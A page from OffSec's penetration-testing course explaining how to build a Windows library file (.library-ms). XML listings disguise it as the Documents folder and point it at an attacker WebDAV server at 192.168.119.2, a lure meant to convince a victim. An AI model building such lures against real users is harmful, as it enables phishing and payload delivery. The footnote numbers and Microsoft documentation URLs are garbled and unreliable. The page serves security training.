# OffSec

Penetration Testing with Kali Linux

library. We'll need to specify a GUID that we can look up on the Microsoft documentation³530 webpage. For example, we'll use the Documents GUID to appear convincing as possible for the victim.

```
<templateInfo>
<folderType>7d49d726-3c21-4f05-99aa-fdc2c9474656</folderType>
</templateInfo>
```

Listing 225 - templateInfo and folderType

The next tag marks the beginning of the library locations section. In this section, we specify the storage location where our library file should point. We'll begin by creating the searchConnectorDescription³51 tag which contains a list of search connectors³52. Search connectors are used by libraries to specify the connections to a remote location. We can specify one or more searchConnectorDescription elements within the searchConnectorList tags. For this we only specify one example.

Inside the search connector, we'll specify information and parameters for our WebDAV server. The first tag we'll use is isDefaultSaveLocation³54 tag with the value set to true. This tag determines the behavior of Windows Explorer when we choose to save as item. Next, we'll use the isSupported tag, which is not documented in the Microsoft Documentation, and we'll use it for compatibility. We can set it to false

The most important tag is url³55 which we need to point to our previously-created WebDAV over HTTP. It is defined within the simpleLocation³56 tags, which we can use to specify the remote location in a more user-friendly way as the locationProvider³57 element.

```
<searchConnectorList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorList>
```

Listing 226 - templateInfo and folderType tags

³50 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/win32/shell/schema-library-foldertypesearchconnectorlist

³51 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/win32/shell/search-connector-library/

³52 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/win32/shell/search-connector-desche-schema-typesearchconnectordescription

³53 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/win32/shell/search-library/

³54 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/win32/search/search-conconn-defaultsaveslocation

³55 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/win32/search/search-conconn-urlsimplelocation

³57 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/win32/search/search-conconn-locationprovider

PWK - Copyright © 2023 OffSec Services Ltd. All rights reserved.

343